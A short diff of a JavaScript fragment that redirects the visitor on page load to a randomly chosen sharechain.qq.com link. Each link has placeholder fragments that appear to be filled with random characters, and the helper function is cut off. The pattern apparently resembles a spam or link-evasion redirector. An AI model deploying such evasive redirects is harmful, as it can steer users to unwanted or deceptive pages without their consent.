@@ -1,5 +1,5 @@
 var urls=[
-' https://sharechain.qq.com/dade3049c11ef50c32630be8068fc0a3#{nnnnnnn}{wwww}',
+' https://sharechain.qq.com/7041770d5690b33ae234dcaeb9f66664#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
